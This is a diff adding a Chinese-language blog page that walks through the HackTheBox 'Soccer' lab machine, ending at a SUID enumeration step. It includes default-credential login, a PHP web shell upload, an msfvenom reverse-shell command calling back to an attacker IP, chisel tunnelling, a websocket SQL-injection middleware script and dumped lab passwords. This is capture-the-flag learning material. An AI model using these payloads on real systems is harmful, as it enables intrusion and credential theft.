@@ -1,0 +1,772 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-TW" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/giwawa.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Peter Luo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HTB-Soccer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Soccer">
+<meta property="og:url" content="https://luoming1995125.github.io/2023/01/21/HTB-Soccer/index.html">
+<meta property="og:site_name" content="Peter Luo Blog">
+<meta property="og:description" content="HTB-Soccer">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://luoming1995125.github.io/img/article/banner/banner-8.jpg">
+<meta property="article:published_time" content="2023-01-21T02:00:18.000Z">
+<meta property="article:modified_time" content="2023-09-21T02:02:51.441Z">
+<meta property="article:author" content="Peter Luo">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://luoming1995125.github.io/img/article/banner/banner-8.jpg">
+  
+  
+  
+  <title>HTB-Soccer - Peter Luo Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"luoming1995125.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Peter Luo x Giwawa</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首頁</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>歸檔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分類</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>標籤</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>關於</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg/bg7.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB-Soccer"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-21 10:00" pubdate>
+          2023年1月21日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          65 分鐘
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HTB-Soccer</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Soccer"><a href="#Soccer" class="headerlink" title="Soccer"></a>Soccer</h1><h2 id="NMAP-enumeration"><a href="#NMAP-enumeration" class="headerlink" title="NMAP enumeration"></a>NMAP enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs !">PORT     STATE SERVICE         REASON         VERSION<br>22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)<br>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=<br>|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)<br>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=<br>|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)<br>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/<br>80/tcp   open  http            syn-ack ttl 63 nginx 1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://soccer.htb/<br>| http-methods: <br>|_  Supported Methods: GET HEAD POST OPTIONS<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>9091/tcp open  xmltec-xmlmail? syn-ack ttl 63<br>| fingerprint-strings: <br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: <br>|     HTTP/1.1 400 Bad Request<br>|     Connection: close<br>|   GetRequest: <br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src &#x27;none&#x27;<br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 139<br>|     Date: Sat, 24 Dec 2022 07:01:03 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=&quot;en&quot;&gt;<br>|     &lt;head&gt;<br>|     &lt;meta charset=&quot;utf-8&quot;&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   HTTPOptions, RTSPRequest: <br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src &#x27;none&#x27;<br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 143<br>|     Date: Sat, 24 Dec 2022 07:01:03 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=&quot;en&quot;&gt;<br>|     &lt;head&gt;<br>|     &lt;meta charset=&quot;utf-8&quot;&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="80-x2F-tcp"><a href="#80-x2F-tcp" class="headerlink" title="80&#x2F;tcp"></a>80&#x2F;tcp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">造訪網頁http://10.10.11.194<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/S5LfQ7N.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">添加 /etc/hosts<br>10.10.11.194 soccer.htb<br><br>造訪 http://soccer.htb/<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/ESss2pE.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>dirsearch<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs !">Target: http://soccer.htb/<br><br>[02:06:16] Starting: <br>[02:06:23] 403 -  564B  - /.ht_wsr.txt<br>[02:06:23] 403 -  564B  - /.htaccess.bak1<br>[02:06:23] 403 -  564B  - /.htaccess.save<br>[02:06:23] 403 -  564B  - /.htaccess.sample<br>[02:06:23] 403 -  564B  - /.htaccess.orig<br>[02:06:23] 403 -  564B  - /.htaccessOLD2<br>[02:06:23] 403 -  564B  - /.htaccessBAK<br>[02:06:23] 403 -  564B  - /.htaccessOLD<br>[02:06:23] 403 -  564B  - /.htaccess_extra<br>[02:06:23] 403 -  564B  - /.htaccess_sc<br>[02:06:23] 403 -  564B  - /.htaccess_orig<br>[02:06:23] 403 -  564B  - /.html<br>[02:06:23] 403 -  564B  - /.htm<br>[02:06:23] 403 -  564B  - /.htpasswd_test<br>[02:06:23] 403 -  564B  - /.htpasswds<br>[02:06:23] 403 -  564B  - /.httr-oauth<br>[02:06:45] 403 -  564B  - /admin/.htaccess<br>[02:06:55] 403 -  564B  - /administrator/.htaccess<br>[02:06:59] 403 -  564B  - /app/.htaccess<br>[02:07:24] 200 -    7KB - /index.html<br></code></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">沒看出甚麼結果<br>改用fuff掃大一點的檔案試試<br><br>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -X POST -u http://soccer.htb/FUZZ<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/MRsgzWF.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>訪問 &#x2F;tiny&#x2F;<br><img src="https://i.imgur.com/22rqoh8.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h2 id="EntryPoint"><a href="#EntryPoint" class="headerlink" title="EntryPoint"></a>EntryPoint</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">根據<br>https://github.com/febinrev/tinyfilemanager-2.4.3-exploit<br>的腳本，找到一組憑據可能是預設的?<br>admin/admin@123<br>試著登入<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/TbOcKlT.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">本來想試著上傳文件<br>結果似乎沒權限<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/u1fNz8U.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">後來發現要在uploads文件夾才有權限上傳<br>構造惡意語法並上傳<br>&lt;?php system($_GET[&#x27;a&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/0U4JL6o.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">網頁會自動清除uploads的檔案<br>怕影響到反連，所以用msfvenom產了一個shell上傳並執行<br>msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.14.8 lport=443 -f elf &gt; mal<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/hnMx24Q.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><ul>
+<li><p>netstat -antp</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.53:53</span>           <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:22</span>              <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:3000</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:9091</span>            <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:33060</span>         <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:3306</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:80</span>              <span class="hljs-number">0.0.0.0</span>:*               LISTEN      <span class="hljs-number">1093</span>/nginx: worker  <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>     <span class="hljs-number">15</span> <span class="hljs-number">10.10.11.194:47840</span>      <span class="hljs-number">10.10.14.8:443</span>          ESTABLISHED <span class="hljs-number">2311</span>/sh             <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:3306</span>          <span class="hljs-number">127.0.0.1:41290</span>         ESTABLISHED -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:41290</span>         <span class="hljs-number">127.0.0.1:3306</span>          ESTABLISHED -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">10.10.11.194:9091</span>       <span class="hljs-number">10.10.14.8:42182</span>        ESTABLISHED -                   <br><span class="hljs-attribute">tcp6</span>       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">22</span>                   :::*                    LISTEN      -                   <br><span class="hljs-attribute">tcp6</span>       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">80</span>                   :::*                    LISTEN      <span class="hljs-number">1093</span>/nginx: worker<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>試著訪問端口3000</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">#kali<br>./chisel_1.7.7_linux_amd64 server -p 8000 -reverse<br><br>#Victim<br>./chisel_1.7.7_linux_amd64 client 10.10.14.8:8000 R:socks<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/YYC3Ksh.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">設置完代理並訪問<br>會得到一個很像的網頁<br>但有登入以及註冊功能<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/OMR1uFU.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">註冊並登入會導向/check<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/PTc1Tds.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">檢查輸入框參數，會送一個id的GET請求，看來我們可以利用id送資料<br>但直接在url輸入並沒有反應<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/POfqHy0.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">檢查網頁原始碼，發現參數會送一個ws請求出去驗證ticket是否有效<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/Yjq3Lm5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">不能使用sqlmap直接對ws協議做Injection<br>參考這篇網址構造Middleware server<br>https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html<br><br># 需添加soc-player子域到/etc/hosts<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>ws_sqli.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs !">from http.server import SimpleHTTPRequestHandler<br>from socketserver import TCPServer<br>from urllib.parse import unquote, urlparse<br>from websocket import create_connection<br><br>ws_server = &quot;ws://soc-player.soccer.htb:9091/ws&quot;<br><br>def send_ws(payload):<br>	ws = create_connection(ws_server)<br>	# If the server returns a response on connect, use below line	<br>	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here<br>	<br>	# For our case, format the payload in JSON<br>	message = unquote(payload).replace(&#x27;&quot;&#x27;,&#x27;\&#x27;&#x27;) # replacing &quot; with &#x27; to avoid breaking JSON structure<br>	data = &#x27;&#123;&quot;id&quot;:&quot;%s&quot;&#125;&#x27; % message<br><br>	ws.send(data)<br>	resp = ws.recv()<br>	ws.close()<br><br>	if resp:<br>		return resp<br>	else:<br>		return &#x27;&#x27;<br><br>def middleware_server(host_port,content_type=&quot;text/plain&quot;):<br><br>	class CustomHandler(SimpleHTTPRequestHandler):<br>		def do_GET(self) -&gt; None:<br>			self.send_response(200)<br>			try:<br>				payload = urlparse(self.path).query.split(&#x27;=&#x27;,1)[1]<br>			except IndexError:<br>				payload = False<br>				<br>			if payload:<br>				content = send_ws(payload)<br>			else:<br>				content = &#x27;No parameters specified!&#x27;<br><br>			self.send_header(&quot;Content-type&quot;, content_type)<br>			self.end_headers()<br>			self.wfile.write(content.encode())<br>			return<br><br>	class _TCPServer(TCPServer):<br>		allow_reuse_address = True<br><br>	httpd = _TCPServer(host_port, CustomHandler)<br>	httpd.serve_forever()<br><br><br>print(&quot;[+] Starting MiddleWare Server&quot;)<br>print(&quot;[+] Send payloads in http://localhost:8081/?id=*&quot;)<br><br>try:<br>	middleware_server((&#x27;0.0.0.0&#x27;,8081))<br>except KeyboardInterrupt:<br>	pass<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>執行後可訪問localhost:8081?id&#x3D;*<br><img src="https://i.imgur.com/yv0jq2g.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://localhost:8081/?id=1&quot;</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/3CAhMn2.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>dump出密碼<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">player / PlayerOftheMatch2022<br></code></pre></td></tr></table></figure>
+<img src="https://i.imgur.com/bNqQEnV.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h3 id="ssh登入"><a href="#ssh登入" class="headerlink" title="ssh登入"></a>ssh登入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">利用剛剛的憑證登入player<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/nL1xylz.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="SUID-enumeration"><a href="#SUID-enumeration" class="headerlink" title="SUID enumeration"></a>SUID enumeration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">find / -perm -u=s 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
